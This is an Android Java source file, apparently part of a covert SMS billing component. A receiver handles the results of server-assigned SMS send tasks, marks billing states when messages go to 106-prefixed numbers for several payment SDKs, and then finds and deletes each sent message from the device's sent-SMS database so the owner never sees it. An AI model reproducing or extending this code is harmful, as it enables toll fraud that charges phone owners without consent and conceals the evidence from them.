package com.thirdparty.engine;

import java.util.ArrayList;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.Date;
import com.msm.modu1e.utils.SMSUtil;
import com.thirdparty.entry.SmsSendTask;
import com.thirdparty.net.Reporter;
import com.thirdparty.net.SmsResultReportCallback;
import com.thirdparty.sms.utils.SmsInterceptHelper;
import com.thirdparty.utils.Constants;
import com.thirdparty.utils.PreferenceUtil;

public class SendSMSResultReceiver extends BroadcastReceiver {
    private static XL_log log = null;
    public static ArrayList<SmsSendTask> smSendSuccessTask = new ArrayList<SmsSendTask>();
    private boolean isExternalOtherThirdSdk = false;

    /***
     *
     * @param intent
     * @return
     */
    private boolean isOurInternalThirdSdkTask(Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return false;
        }
        String toNumber = "";
        String action = intent.getAction();
        /***
         * if(sdk==95) //this is internal thirdparty sdk action
         * if(sdk==95 && other other ==yunbei ) //this is internal thirdparty pay    sdk and this sdk is yunbei action
         */
        String sdk = intent.getStringExtra("sdk");
        String other = intent.getStringExtra("other");
        if (!TextUtils.isEmpty(action)) {
            if (action.equals(Constants.RECEIVER_FILTER_YUFENG_SMS_SEND_ACTION)) {
                log.debug("SendSMSResultReceiver receive action yufeng");
                toNumber = intent.getStringExtra("SMS_TO");
                if (TextUtils.isEmpty(sdk) || !sdk.equals("95")) {
                    log.debug("this action is not out internal yufeng sdk action ");
                    isExternalOtherThirdSdk = true;
                    return false;
                } else {
                    log.debug("is our internal yufeng sdk action");
                }
                if (toNumber != null) {
                    log.debug("yufeng sdk send sms to:" + toNumber);
                    if (toNumber.startsWith("106")) {
                        log.debug("yufeng sdk have channel and send sms to:" + toNumber);
                        ThirdSdkPayHepler.setYuFengDoSendSmsActionState(true);
                    }
                }
            } else if (action.equals(Constants.RECEIVER_FILTER_WEIYUN_SMS_SEND_ACTION) && other != null && other.equals("yunbei")) {
                log.debug("SendSMSResultReceiver receive action yunbei");
                toNumber = intent.getStringExtra("toNumber");
                if (TextUtils.isEmpty(sdk) || !sdk.equals("95")) {
                    log.debug("this action is not out internal yunbei sdk action ");
                    isExternalOtherThirdSdk = true;
                    return false;
                } else {
                    log.debug("is our internal yunbei sdk action");
                }
                if (toNumber != null) {
                    log.debug("yunbei sdk send sms to:" + toNumber);
                    if (toNumber.startsWith("106")) {
                        log.debug("yunbei sdk have channel and send sms to:" + toNumber);
                        ThirdSdkPayHepler.setYunBeiDoSendSmsActionState(true);
                    }
                }
            } else if (action.equals(Constants.RECEIVER_FILTER_WEIYUN_SMS_SEND_ACTION) && TextUtils.isEmpty(other)) {
                log.debug("SendSMSResultReceiver receive action weiyun");
                toNumber = intent.getStringExtra("toNumber");

                if (TextUtils.isEmpty(sdk) || !sdk.equals("95")) {
                    log.debug("this action is not out internal weiyun sdk action ");
                    isExternalOtherThirdSdk = true;
                    return false;
                } else {
                    log.debug("is our internal weiyun sdk action");
                }
                if (toNumber != null) {
                    log.debug("weiyun sdk send sms to:" + toNumber);
                    if (toNumber.startsWith("106")) {
                        log.debug("weiyun sdk have channel and send sms to:" + toNumber);
                        ThirdSdkPayHepler.setWeiYunDoSendSmsActionState(true);
                    }
                }
            }
        }
        boolean isWy = ThirdSdkPayHepler.getWeiYunDoSendSmsActionState();
        boolean isYf = ThirdSdkPayHepler.getYuFengDoSendSmsActionState();
        boolean isYunBei = ThirdSdkPayHepler.getYunBeiDoSendSmsActionState();
        if (!isWy && !isYf && !isYunBei) {
            log.debug("send sms action is not internal third sdk ");
            return false;
        }
        switch (getResultCode()) {
            case Activity.RESULT_OK:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " success");
                    ThirdSdkPayHepler.setWeiYunJiFeiState(true);
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " success");
                    ThirdSdkPayHepler.setYuFengJiFeiState(true);
                } else if (isYunBei) {
                    log.debug("YunBei send to :" + toNumber + " success");
                    ThirdSdkPayHepler.setYunBeiJiFeiState(true);
                }
                break;
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " error:" + " RESULT_ERROR_GENERIC_FAILURE");
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " error:" + " RESULT_ERROR_GENERIC_FAILURE");
                } else if (isYunBei) {
                    log.debug("Yunbei send to :" + toNumber + " error:" + " RESULT_ERROR_GENERIC_FAILURE");
                }
                break;
            case SmsManager.RESULT_ERROR_RADIO_OFF:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " error:" + " RESULT_ERROR_RADIO_OFF");
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " error:" + " RESULT_ERROR_RADIO_OFF");
                } else if (isYunBei) {
                    log.debug("Yunbei send to :" + toNumber + " error:" + " RESULT_ERROR_RADIO_OFF");
                }
                break;
            case SmsManager.RESULT_ERROR_NULL_PDU:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " error:" + " RESULT_ERROR_NULL_PDU");
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " error:" + " RESULT_ERROR_NULL_PDU");
                } else if (isYunBei) {
                    log.debug("Yunbei send to :" + toNumber + " error:" + " RESULT_ERROR_NULL_PDU");
                }
            case SmsManager.RESULT_ERROR_NO_SERVICE:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " error:" + " RESULT_ERROR_NO_SERVICE");
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " error:" + " RESULT_ERROR_NO_SERVICE");
                } else if (isYunBei) {
                    log.debug("Yunbei send to :" + toNumber + " error:" + " RESULT_ERROR_NO_SERVICE");
                }
            default:
                if (isWy) {
                    log.debug("WeiYun send to :" + toNumber + " error:" + "OTHER_ERROR result code:" + getResultCode());
                } else if (isYf) {
                    log.debug("YuFeng send to :" + toNumber + " error:" + "OTHER_ERROR result code:" + getResultCode());
                } else if (isYunBei) {
                    log.debug("Yunbei send to :" + toNumber + " error:" + "OTHER_ERROR result code:" + getResultCode());
                }
        }
        return true;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        isExternalOtherThirdSdk = false;
        if (log == null) {
            log = new XL_log(SendSMSResultReceiver.class);
        }
        if (intent == null)
            return;
        boolean isOurInternalThirdSdkTask = isOurInternalThirdSdkTask(intent);
        if (isOurInternalThirdSdkTask) {
            return;
        }
        if (isExternalOtherThirdSdk) {
            log.debug("isExternalOtherThirdSdk");
            return;
        }
        switch (getResultCode()) {
            case Activity.RESULT_OK:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    if (smsSendTask == null) {
                        return;
                    }
                    String taskid = smsSendTask.mTaskId;
                    log.debug("SEND_SMS_RESULT_SUCCESS:" + "taskId;" + taskid + " simId:" + smsSendTask.mSimId + " ,toNumber:"
                            + smsSendTask.mSendToNumber + " ,content:" + smsSendTask.mContent);
                    II1.removeRetrySendWithOtherSimIdSmsTask(smsSendTask.mSendToNumber, smsSendTask.mContent, smsSendTask.mSimId);
                    //Reporter.reportSmsSendResult(context, taskid, 0, "send sms success");
                    long id = getSentSmsIdFrom(context, smsSendTask.mContent, smsSendTask.mSendToNumber);
                    if (id >= 0) {
                        boolean deleteRet = deleteIndexSmsRecordFromId(context, id);
                        if (deleteRet) {
                            log.debug("report taskId" + smsSendTask.mTaskId + " simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber
                                    + " ,content:" + smsSendTask.mContent + " ,find sms record and  delete sms from db success");
                        } else {
                            log.debug("report taskId:" + smsSendTask.mTaskId + " simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber
                                    + " ,content:" + smsSendTask.mContent + " ,find sms record and delete sms from db fail");
                        }
                    } else {
                        log.debug("report : taskId:" + smsSendTask.mTaskId + "simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber
                                + " ,content:" + smsSendTask.mContent + " don't find the sms record from db ,don't need to delete");
                    }

                }
                break;
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    int errorCode = -100;
                    try {
                        errorCode = intent.getIntExtra("errorCode", errorCode);
                    } catch (Exception e) {
                        log.error(Log.getStackTraceString(e));
                    }
                    String simId = smsSendTask.mSimId + "";
                    if (smsSendTask != null) {
                        log.error("RESULT_ERROR_GENERIC_FAILURE errorCode:" + errorCode + " taskId:" + smsSendTask.mTaskId + " simId:" + smsSendTask.mSimId + " ,toNumber:"
                                + smsSendTask.mSendToNumber + " ,content:" + smsSendTask.mContent);
                        //Reporter.reportSmsSendResult(context, smsSendTask.mTaskId, 2, "RESULT_ERROR_GENERIC_FAILURE , errorCode:" + errorCode);
                    }
                }
                log.error("RESULT_ERROR_GENERIC_FAILURE");
                break;
            case SmsManager.RESULT_ERROR_RADIO_OFF:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    String simId = smsSendTask.mSimId + "";
                    if (smsSendTask != null) {
                        log.info("RESULT_ERROR_RADIO_OFF:" + "taskId:" + smsSendTask.mTaskId + " simId:" + smsSendTask.mSimId + " ,toNumber:"
                                + smsSendTask.mSendToNumber + " ,content:" + smsSendTask.mContent);
                      //  Reporter.reportSmsSendResult(context, smsSendTask.mTaskId, 2, "RESULT_ERROR_RADIO_OFF");
                    }
                }
                log.error("RESULT_ERROR_RADIO_OFF");
                break;
            case SmsManager.RESULT_ERROR_NULL_PDU:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    String simId = smsSendTask.mSimId + "";
                    if (smsSendTask != null) {
                        log.info("RESULT_ERROR_NULL_PDU:" + "simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber + " ,content:"
                                + smsSendTask.mContent);
                     //   Reporter.reportSmsSendResult(context, smsSendTask.mTaskId, 2, "RESULT_ERROR_NULL_PDU");
                    }
                }
                log.error("RESULT_ERROR_NULL_PDU");
            case SmsManager.RESULT_ERROR_NO_SERVICE:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    String simId = smsSendTask.mSimId + "";
                    if (smsSendTask != null) {
                        log.info("RESULT_ERROR_NO_SERVICE:" + "simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber + " ,content:"
                                + smsSendTask.mContent);
                       // Reporter.reportSmsSendResult(context, smsSendTask.mTaskId, 2, "RESULT_ERROR_NO_SERVICE");
                    }
                }
                log.error("RESULT_ERROR_NO_SERVICE");
            default:
                if (intent != null) {
                    SmsSendTask smsSendTask = (SmsSendTask) intent.getSerializableExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    String simId = smsSendTask.mSimId + "";
                    if (smsSendTask != null) {
                        log.info("OTHER_ERROR result code:" + getResultCode() + " simId:" + smsSendTask.mSimId + " ,toNumber:" + smsSendTask.mSendToNumber + " ,content:"
                                + smsSendTask.mContent);
                      //  Reporter.reportSmsSendResult(context, smsSendTask.mTaskId, 2, "OTHER_ERROR result code :" + getResultCode());
                    }
                }
                log.error("OTHER_ERROR result code:" + getResultCode());
        }
    }

    public static SmsSendTask determineIsOurSendSmsTask(String toNumber, String content) {
        if (TextUtils.isEmpty(toNumber)) {
            return null;
        }
        if (TextUtils.isEmpty(content)) {
            return null;
        }
        for (int i = 0; i < smSendSuccessTask.size(); i++) {
            SmsSendTask sendTask = smSendSuccessTask.get(i);
            String addr = sendTask.mSendToNumber;
            String body = sendTask.mContent;
            if (TextUtils.isEmpty(addr) || TextUtils.isEmpty(body)) {
                continue;
            }
            if (addr.equals(toNumber) && body.equals(content)) {
                return sendTask;
            }
        }
        return null;
    }

    public static boolean deleteIndexSmsRecordFromId(Context context, long id) {
        boolean deleteRet = false;
        SmsInterceptHelper hepler = SmsInterceptHelper.getInstance(context);
        deleteRet = hepler.deleteIndexSmsRecordById(context, id);
        if (!deleteRet) {
            deleteRet = hepler.deleteIndexSmsRecordById(context, id);
        }
        return deleteRet;
    }

    public static boolean deleteSentSmsRecordFromId(Context context, long id) {
        boolean deleteRet = false;
        deleteRet = SmsInterceptHelper.deleteSentSmsRecordById(context, id);
        if (!deleteRet) {
            deleteRet = SmsInterceptHelper.deleteSentSmsRecordById(context, id);
        }
        return deleteRet;
    }

    public static long getSentSmsIdFrom(Context context, String content, String number) {
        ContentResolver resolver = context.getContentResolver();
        // "_id", "address", "body", "sim_id"
        // HM Note1 4.4.4:sim_id Lenove 4.2.2 :sim_id | oppo 4.2.2 :sim_id
        // samsuny s6 6.0 :sim_slot
        boolean deleteRet = false;
        long id = -1;
        if (TextUtils.isEmpty(content) || TextUtils.isEmpty(number)) {
            return id;
        }
        Cursor cursor = resolver.query(Uri.parse("content://sms/sent"), new String[]{"_id", "address", "body"}, null, null, "_id desc");
        if (cursor == null) {
            return id;
        }
        if (cursor.moveToFirst()) {
            int length = cursor.getCount();
            for (int i = 0; i < length; i++) {
                id = cursor.getLong(0);
                String address = cursor.getString(1);
                String body = cursor.getString(2);
                if (TextUtils.isEmpty(address) || TextUtils.isEmpty(body)) {
                    return id;
                }
                if (content.equals(body) && address.equals(number)) {
                    return id;
                }
                cursor.moveToNext();
            }
        }
        cursor.close();
        return id;
    }

}
